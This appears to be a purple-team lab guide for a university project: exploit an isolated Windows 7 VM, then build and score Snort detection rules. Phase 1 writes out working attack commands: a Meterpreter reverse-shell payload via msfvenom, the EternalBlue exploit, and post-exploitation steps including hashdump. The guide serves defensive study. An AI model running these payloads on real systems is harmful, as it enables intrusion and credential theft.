# Purple Team Lab — Build Guide

**Project 2 — Exploitation, Detection Engineering & IDS Evaluation**

This is the working guide. Follow it phase by phase inside your VMs. Everything you
capture along the way feeds the final report and the GitHub repository.

Repository root: `D:\Project-2-Purple-Team-Lab`

---

## Contents

- [Phase 0 — Lab construction](#phase-0--lab-construction)
- [Phase 1 — Attack chains](#phase-1--attack-chains)
- [Phase 2 — Detection engineering](#phase-2--detection-engineering)
- [Phase 3 — Measurement](#phase-3--measurement)
- [Phase 4 — Research report](#phase-4--research-report)
- [Evidence checklist](#evidence-checklist)
- [Troubleshooting](#troubleshooting)

---

## Phase 0 — Lab construction

### Topology

All three VMs sit on a single VirtualBox **Host-Only** network, `192.168.56.0/24`.
No bridged adapters. Nothing in this lab touches your home LAN or the internet.

| VM | Role | Static IP | RAM | Adapter 1 | Adapter 2 |
|---|---|---|---|---|---|
| Kali Linux | Attacker | 192.168.56.10 | 4 GB | Host-Only (`eth0`) | NAT — *disabled during runs* |
| Windows 7 SP1 | Victim | 192.168.56.20 | 2 GB | Host-Only only | **none, ever** |
| Ubuntu 20.04 Server | Snort sensor | 192.168.56.30 | 2 GB | NAT (`enp0s3`) | Host-Only (`enp0s8`), promiscuous |

**The victim gets one adapter and it is host-only.** Windows 7 SP1 with no patches,
SMBv1 enabled, firewall off and Defender disabled is precisely the machine that
WannaCry ate in 2017. It must never see a route to the internet — not for updates,
not for "just a second to download something". If you need a file on it, serve it
from Kali over the host-only network.

The sensor needs a NAT adapter purely to `apt install snort`. Disable it once Snort
is installed so the sensor is also isolated during measured runs — and note in the
report that the sensor was air-gapped during data collection.

Kali's NAT adapter is likewise for updates only. Turn it off before any attack run so
your captures contain lab traffic and nothing else.

### Why host-only instead of the bridged adapter the task sheets specify

Both task sheets instruct you to set the adapter to Bridged. That places a machine
you are about to infect with a live reverse shell directly onto your home network,
alongside your phone, your router and any other device on it. Host-only keeps every
packet inside the hypervisor.

Record this decision in the report. A deliberate, justified deviation from supplied
instructions on containment grounds is a genuine professional judgement call and is
worth more than blind compliance.

### Step 0.1 — Create the host-only network

In VirtualBox: **Tools → Network → Host-only Networks → Create**.

- IPv4 address: `192.168.56.1`, mask `255.255.255.0`
- DHCP server: **disabled** (we assign static IPs so addresses stay stable across
  snapshots, and so your pcaps and rules never go stale)

### Step 0.2 — CRITICAL: promiscuous mode on the sensor

A VirtualBox host-only network behaves like a **switch**, not a hub. By default the
sensor VM will *not* see unicast traffic flowing between Kali and Windows 7 — Snort
will sit there logging nothing and you will lose hours to it.

For the **Ubuntu sensor VM's host-only adapter (Adapter 2)**:

**Settings → Network → Adapter 2 → Advanced → Promiscuous Mode → `Allow All`**

Then inside the sensor, put the interface itself into promiscuous mode:

```
sudo ip link set enp0s8 promisc on
ip link show enp0s8        # confirm PROMISC appears in the flags
```

Verify before going further — from Kali, ping the Windows 7 VM while the sensor runs:

```
sudo tcpdump -i enp0s8 -n icmp
```

If you see the ICMP echo requests between `.10` and `.20`, the sensor is correctly
positioned. If you see nothing, promiscuous mode is not set — go back and fix it.
Do not proceed until this test passes.

### Step 0.3 — Static addressing

Set each VM to its address from the table above. Confirm with `ip a` on Kali and
Ubuntu, and `ipconfig /all` on Windows 7. **Screenshot all three** — the Kali one is
the direct answer to Task 8.2HD Q2.

Verify full mesh connectivity by pinging every host from every other host.

### Step 0.4 — Weaken the victim, and log every change

The Windows 7 VM is vulnerable by design. Make these changes and write down each one
— this becomes the "target configuration" section of your methodology, and it is what
makes the experiment reproducible by someone else.

- Windows Firewall: off (all profiles)
- Windows Defender / any AV: disabled
- SMBv1: enabled (required for the MS17-010 chain)
- UAC: lowest setting
- Windows Update: disabled, no patches applied
- Note the exact build: `systeminfo` — capture OS version, build number, hotfixes
- Note the architecture: `wmic os get osarchitecture` — this decides which payload
  you generate

### Step 0.5 — Snapshot everything

Snapshot all three VMs as **`clean-baseline`** before anything else happens.

You will restore these repeatedly. EternalBlue in particular can blue-screen the
target, and you need a clean victim for every measured attack run so your results
are not contaminated by leftover state from a previous run.

### Step 0.6 — Baseline capture (do not skip)

Before any attack, capture 10–15 minutes of ordinary traffic: the victim browsing
between VMs, file shares, idle chatter, DNS.

```
sudo tcpdump -i enp0s8 -w /captures/baseline-clean.pcap
```

This is your **false-positive control**. Replaying your finished rules against this
clean capture is how you prove a rule does not fire on benign traffic. Without a
control capture you cannot report a false-positive rate, and the measurement half of
the project collapses.

---

## Phase 1 — Attack chains

Covers **Task 4.4HD**.

Run two chains. Two attack paths with different characteristics give you a far
richer detection problem than one, and let you compare user-initiated compromise
against remote exploitation.

Restore the victim to `clean-baseline` before each run.

### Always: start the capture first

On the sensor, before every single attack run:

```
sudo tcpdump -i enp0s8 -w /captures/chainA-run1-$(date +%Y%m%d-%H%M%S).pcap
```

Note the wall-clock start time. You need timestamps to compute detection latency
in Phase 3.

These pcaps are the raw research data required by Task 10.2HD, they let you re-test
rules offline as many times as you like without rebuilding the lab, and they are what
makes the GitHub repo genuinely reproducible. **The pcaps matter more than the
screenshots.**

### Chain A — social-engineered payload

This is the chain the task sheet asks for.

**A1. Reconnaissance**

```
nmap -sn 192.168.56.0/24
nmap -sS -sV -p- 192.168.56.20 -oN recon-full.txt
```

**A2. Generate the payload**

32-bit victim:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f exe -o /var/www/html/update.exe
```

64-bit victim:

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f exe -o /var/www/html/update.exe
```

Record the SHA-256 — the repo ships this hash instead of the binary:

```
sha256sum /var/www/html/update.exe
```

**A3. Stage the delivery**

```
sudo systemctl start apache2
```

**A4. Start the handler**

```
msfconsole -q
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.56.10
set LPORT 4444
set ExitOnSession false
exploit -j
```

**A5. Execute on the victim**

On Windows 7, browse to `http://192.168.56.10/update.exe`, download and run it.
Screenshot the download and the session opening back on Kali.

**A6. Post-exploitation**

```
sessions -i 1
sysinfo
getuid
ps
migrate <explorer.exe PID>
getsystem
getuid
hashdump
screenshot
download C:\\Users\\<user>\\Documents\\<file>
shell
```

`getsystem` is your privilege escalation demonstration — capture `getuid` both before
and after so the escalation is visible. `migrate` into a long-lived process shows you
understand persistence of access within a session.

### Chain B — remote exploitation, MS17-010 / EternalBlue

CVE-2017-0144. No user interaction required. This is the chain that lifts the project
above coursework, and it produces highly distinctive SMB traffic that you will write
a signature against.

**B1. Confirm the target is vulnerable**

```
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.56.20
run
```

**B2. Exploit**

```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.56.20
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.10
set LPORT 5555
check
exploit
```

Note the different port (5555) from Chain A. That gives you two distinct C2 channels
to detect, and lets you show a port-agnostic rule beating a port-specific one.

If the target blue-screens: that is a documented, expected failure mode of this
exploit against certain kernel versions. Restore the snapshot, retry, and **write it
up** — a failed exploitation attempt with an explanation of the mechanism is more
interesting than a clean success, and it produces exploitation traffic worth
detecting even when the exploit fails.

**B3. Same post-exploitation sequence as Chain A.**

### Screencast

Record both chains with OBS Studio. Show the commands, the session establishing, and
the post-exploitation. Upload unlisted to YouTube — the link goes in the README and
answers Task 4.4HD Q1.

### Reflection (4.4HD Q2)

Write it as you go, not afterwards. What broke, what you had to research, where the
guide was wrong, what surprised you. Specifics beat generalities.

---

## Phase 2 — Detection engineering

Covers **Task 8.2HD**.

### Step 2.1 — Install Snort on the Ubuntu sensor

```
sudo apt update
sudo apt install -y snort
```

The installer prompts for the address range and interface — give it `192.168.56.0/24`
and your host-only interface.

**Why not the task sheet's method:** 8.2HD instructs you to delete
`/var/lib/apt/lists`, overwrite Kali's `sources.list` with an Ubuntu one, and
authenticate with `apt-key`. `apt-key` has been deprecated since 2021, and grafting
Ubuntu repositories onto a Kali base is a well-known way to break the package system
beyond repair. Installing on a real Ubuntu host gets you the identical
`/etc/snort/snort.conf` layout with none of that risk. Document the deviation.

For **8.2HD Q1** (what APT is and why it is useful): package manager for
Debian-family systems — dependency resolution, repository management, signed
packages, atomic install/upgrade/removal. The Lynx install from the task sheet is a
fine demonstration:

```
sudo apt-get -y install lynx
```

### Step 2.2 — Configure

Edit `/etc/snort/snort.conf`:

**Step 1 of the config** — set the home network:

```
ipvar HOME_NET 192.168.56.0/24
ipvar EXTERNAL_NET !$HOME_NET
```

Setting `EXTERNAL_NET` as the inverse of `HOME_NET` rather than `any` cuts a large
class of false positives. Worth a sentence in the report.

**Step 7 of the config** — comment out every bundled `include $RULE_PATH/*.rules`
line, then uncomment exactly one:

```
include $RULE_PATH/local.rules
```

### Step 2.3 — Prove the pipeline works

Put the task sheet's basic rule in `/etc/snort/rules/local.rules`:

```
alert tcp any any -> any any (msg:"TCP Connection Detected!"; sid:100006927; rev:1;)
```

Run Snort:

```
sudo snort -d -l /var/log/snort/ -A console -c /etc/snort/snort.conf -i enp0s8
```

Generate traffic and confirm alerts appear. Screenshot it — that is **8.2HD Q3**.

This rule is deliberately terrible: it alerts on every TCP packet on the wire. Say so
in the report. It demonstrates the pipeline is working and simultaneously demonstrates
why alert fatigue destroys real SOCs. Then replace it with rules that mean something.

### Step 2.4 — The real ruleset

Task Q4 asks for two rules. Write six, each targeting traffic your own attacks
actually generated. Every rule needs a unique SID in the local range (1,000,000+).

Design them against your pcaps, iterating with offline replay (Step 2.5) rather than
re-running attacks each time.

| # | Detects | Approach |
|---|---|---|
| 1 | Host discovery sweep | ICMP echo with `threshold` on unique destinations |
| 2 | Nmap SYN scan | `flags:S;` plus `threshold type threshold, track by_src` |
| 3 | Executable download over HTTP | `content:"GET"; content:".exe"; http_uri` |
| 4 | Meterpreter reverse_tcp callback | Outbound from `$HOME_NET` to the C2 port |
| 5 | SMBv1 exploitation attempt | Content match on the MS17-010 trans2 pattern |
| 6 | Meterpreter stager | Byte-pattern match on the initial stage transfer |

Two design points to raise in the report:

- **Rule 4 is port-specific and therefore fragile.** Show it failing when Chain B uses
  port 5555, then write a port-agnostic version. That contrast is a real detection
  engineering lesson and is exactly the kind of thing that reads well.
- **Thresholds and rate limits** are what separate a rule that works in a lab from one
  that works in production. Explain why you tuned each one to the value you chose.

For each rule record: the rule text, the SID, what it is designed to catch, and its
observed behaviour against both the attack pcaps and the clean baseline.

Screenshot the rules firing — that is **8.2HD Q4**.

### Step 2.5 — Offline replay (the technique that saves the project)

You do not need to re-run attacks to test rules. Replay the captures:

```
sudo snort -r /captures/chainA-run1.pcap -c /etc/snort/snort.conf -A console -l /tmp/snortout -q
```

Iterate on rules in seconds instead of rebuilding VMs. This is also the mechanism by
which anyone cloning the repo can reproduce your results exactly, which is what the
"attach your raw data" requirement in 10.2HD is really asking for.

---

## Phase 3 — Measurement

This is the phase that turns three lab write-ups into an engineering project, and it
supplies the Results section of the research report.

For each of the six rules, replay every attack pcap **and** the clean baseline, then
record:

- **True positives** — did it fire on the attack traffic it targets?
- **False positives** — did it fire on `baseline-clean.pcap`? How many times?
- **Detection latency** — seconds between the first attack packet and the first alert
- **Alert volume** — total alerts per run (a rule that fires 40,000 times is useless
  even when technically correct)

Build a results table: rules down the side, chains across the top. Then a summary of
which stages of the attack chain were detected and which passed silently.

The gaps are the most valuable part of the analysis. Expect to find that
post-exploitation activity inside an established session is largely invisible to
signature matching, because it is just bytes on an already-open socket. That finding
drives the Discussion section.

I will write the Python tooling (`scripts/parse_alerts.py`, `scripts/replay_and_score.py`)
to parse your Snort logs into `results/detection_metrics.csv` and generate the charts
once you hand me the raw logs.

---

## Phase 4 — Research report

Covers **Task 10.2HD, Option 3** — Emerging Threats and Defense Mechanisms.
2,500–3,000 words, IEEE referencing.

**Working title:** *Detecting Post-Exploitation Command-and-Control: An Experimental
Evaluation of Signature-Based Intrusion Detection Against Meterpreter Reverse-TCP and
MS17-010 Exploitation*

Mapped onto the supplied template:

| Section | Content | Words |
|---|---|---|
| Introduction | The threat, the research question, why it matters | ~350 |
| Methodology | The lab as experimental apparatus, both chains, ruleset design, how you measured | ~600 |
| Results | Detection table, latency, false positives, charts | ~600 |
| Discussion | Where signature detection succeeded and failed, why, and what follows | ~800 |
| Conclusion | Findings, limitations, future work | ~350 |
| References | IEEE, 12–15 credible sources | — |
| Appendices | Full ruleset, link to repo for pcaps and logs | — |

**The research question:** *To what extent can signature-based network intrusion
detection identify the stages of a Meterpreter-based intrusion, and where does it
fail?*

**Discussion themes that earn the 20 Critical Analysis marks:**

- Signature detection catches delivery and exploitation, but degrades sharply against
  post-exploitation traffic inside an established session
- The port-specific rule failing on Chain B is a concrete demonstration of signature
  brittleness — use your own data, not a citation
- Encryption and payload obfuscation (`msfvenom` encoders, staged vs stageless
  payloads) defeat content matching entirely — you can test this if you have time
- The case for behavioural and anomaly-based detection as a complement, not a
  replacement — and honestly, its own false-positive cost
- Detection latency versus dwell time: what does a 3-second detection actually buy a
  defender who cannot respond for 30 minutes?

**Limitations to state honestly** (markers and hiring managers both reward this):
single victim OS, no encrypted C2 tested, small sample of runs, lab traffic is far
cleaner than production, no evasion techniques attempted.

The rubric's 20 marks for Originality are earned by the fact that every number in the
Results section came from an experiment you ran yourself.

---

## Evidence checklist

Collect these as you go. The report writes itself if you have them, and you will be
rebuilding VMs if you do not.

**Phase 0**
- [ ] Network topology diagram
- [ ] `ip a` on Kali (8.2HD Q2) and Ubuntu, `ipconfig /all` on Windows 7
- [ ] `systeminfo` and `wmic os get osarchitecture` from the victim
- [ ] Full list of every weakening change made to the victim
- [ ] Snapshot names and what state each represents
- [ ] `baseline-clean.pcap`

**Phase 1**
- [ ] Every command as copy-pasted **text**, not only screenshots
- [ ] `msfvenom` command plus SHA-256 of the payload
- [ ] pcap for every attack run, named consistently
- [ ] Wall-clock start time of each run
- [ ] Screenshots: session established, `getuid` before and after `getsystem`, `sysinfo`, `hashdump`
- [ ] Nmap output files
- [ ] Screencast for both chains
- [ ] Reflection notes written the same day

**Phase 2**
- [ ] `snort.conf` diff against the stock file
- [ ] Final `local.rules` with comments explaining each rule
- [ ] Raw `/var/log/snort/alert` from every run
- [ ] Console screenshots of rules firing
- [ ] Notes on every rule that did *not* work and why

**Phase 3**
- [ ] Replay output for all six rules against all pcaps
- [ ] False-positive counts from the clean baseline
- [ ] Latency measurements

Copy everything into `D:\Project-2-Purple-Team-Lab\evidence\` as you go — pcaps to
`pcaps\`, Snort logs to `logs\`, screenshots to `docs\screenshots\`.

---

## Troubleshooting

**Sensor sees no traffic between Kali and Windows 7**
Promiscuous mode is not set to `Allow All` on the sensor's adapter in the VirtualBox
settings, or the interface is not in PROMISC. See Step 0.2. This is the single most
common failure in this build.

**Meterpreter session opens then immediately dies**
Almost always architecture mismatch — a 64-bit payload on a 32-bit target or the
reverse. Check `wmic os get osarchitecture` and regenerate. Failing that, migrate to a
stable process faster.

**Victim never connects back**
Firewall still on somewhere, wrong LHOST baked into the payload, or the handler is not
actually listening. Confirm with `netstat -tlnp | grep 4444` on Kali.

**EternalBlue reports "not vulnerable"**
SMBv1 is disabled on the target, or the patch is present. Re-check Step 0.4 and
confirm with the `smb_ms17_010` scanner.

**Snort will not start — config errors**
Read the line number in the error. Usually an uncommented `include` pointing at a
ruleset file that is not present, or a whitelist/blacklist path from the preprocessor
section. Comment those out too.

**Snort runs but never alerts**
Wrong interface with `-i`, `HOME_NET` does not match your actual subnet, or
`local.rules` is still commented out in Step 7 of the config.

**Anything else** — capture the exact error text and bring it to me. Troubleshooting
notes are worth keeping; the problems you solved are report material.

---

## When you are done

Hand me the collected report and evidence. I will build out the full repository —
documentation set, Python analysis tooling, results and charts, tests, README, git
history — in `D:\Project-2-Purple-Team-Lab`, ready to push to GitHub, with a mirrored
backup elsewhere on D:.
